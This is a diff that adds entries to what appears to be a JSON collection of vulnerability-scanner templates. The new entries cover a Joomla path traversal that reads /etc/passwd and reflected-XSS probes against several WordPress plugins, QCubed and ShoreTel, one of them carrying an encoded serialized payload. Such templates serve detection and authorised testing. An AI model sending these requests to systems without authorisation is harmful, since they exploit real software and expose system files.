@@ -2422,6 +2422,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1957",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Love Factory (com_lovefactory) component 1.3.4 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Love Factory 1.3.4 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12235",
+          "https://www.cvedetails.com/cve/CVE-2010-1957"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_lovefactory&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1979",
       "info": {
         "author": "daffainfo",
@@ -7087,6 +7124,54 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/new-year-firework/firework/index.php?text=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000141",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2016-1000141",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Reflected XSS in wordpress plugin page-layout-builder v1.9.3",
+        "name": "Page Layout builder v1.9.3 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000141",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/page-layout-builder/includes/layout-settings.php?layout_settings_id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -21488,6 +21573,58 @@
       ]
     },
     {
+      "id": "CVE-2020-24912",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2020-24912",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "A reflected cross-site scripting (XSS) vulnerability in qcubed (all versions including 3.1.1) in profile.php via the stQuery-parameter allows unauthenticated attackers to steal sessions of authenticated users.",
+        "name": "QCube Cross-Site-Scripting",
+        "reference": [
+          "https://www.ait.ac.at/themen/cyber-security/pentesting/security-advisories/ait-sa-20210215-03",
+          "https://nvd.nist.gov/vuln/detail/CVE-2020-24912",
+          "http://seclists.org/fulldisclosure/2021/Mar/30"
+        ],
+        "severity": "medium",
+        "tags": "cves,cve2020,qcubed,xss"
+      },
+      "requests": [
+        {
+          "body": "intDatabaseIndex=1&StrReferrer=somethinxg&strProfileData=YToxOntpOjA7YTozOntzOjEyOiJvYmpCYWNrdHJhY2UiO2E6MTp7czo0OiJhcmdzIjthOjE6e2k6MDtzOjM6IlBXTiI7fX1zOjg6InN0clF1ZXJ5IjtzOjExMjoic2VsZWN0IHZlcnNpb24oKTsgc2VsZWN0IGNvbnZlcnRfZnJvbShkZWNvZGUoJCRQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDRLJCQsJCRiYXNlNjQkJCksJCR1dGYtOCQkKSI7czoxMToiZGJsVGltZUluZm8iO3M6MToiMSI7fX0K=",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert('xss')</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Content-Type: text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/assets/_core/php/profile.php",
+            "{{BaseURL}}/assets/php/profile.php",
+            "{{BaseURL}}/vendor/qcubed/qcubed/assets/php/profile.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-24949",
       "info": {
         "author": "geeknik",
@@ -22374,6 +22511,54 @@
           "matchers-condition": "and",
           "raw": [
             "POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/json\n\n{\"message\":\"{\\\"msg\\\":\\\"method\\\",\\\"method\\\":\\\"sendForgotPasswordEmail\\\",\\\"params\\\":[\\\"user@local.email\\\"],\\\"id\\\":\\\"3\\\"}\"}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-28351",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2020-28351",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "conferencing component on Mitel ShoreTel 19.46.1802.0 devices could allow an unauthenticated attacker to conduct a reflected cross-site scripting (XSS) attack (via the PATH_INFO to index.php) due to insufficient validation for the time_zone object in the HOME_MEETING& page",
+        "name": "ShoreTel 19.46.1802.0 XSS",
+        "reference": [
+          "https://packetstormsecurity.com/files/159987/ShoreTel-Conferencing-19.46.1802.0-Cross-Site-Scripting.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2020-28351"
+        ],
+        "severity": "medium",
+        "tags": "cves,cve2020,shoretel,xss"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Content-Type: text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME"
           ]
         }
       ]
@@ -27489,6 +27674,56 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/wp-statistics/readme.txt"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24342",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2021-24342",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "JNews WordPress theme before 8.0.6 did not sanitise the cat_id parameter in the POST request /?ajax-request=jnews (with action=jnews_build_mega_category_*), leading to a Reflected Cross-Site Scripting (XSS) issue.",
+        "name": "JNews < 8.0.6 - Reflected Cross-Site Scripting (XSS)",
+        "reference": [
+          "https://wpscan.com/vulnerability/415ca763-fe65-48cb-acd3-b375a400217e",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-24342"
+        ],
+        "severity": "medium",
+        "tags": "cves,cve2021,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Content-Type: text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /?ajax-request=jnews HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nlang=en_US&cat_id=6\"></script><script>alert(document.domain)</script>&action=jnews_build_mega_category_2&number=6&tags=70%2C64%2C10%2C67\n"
           ]
         }
       ]
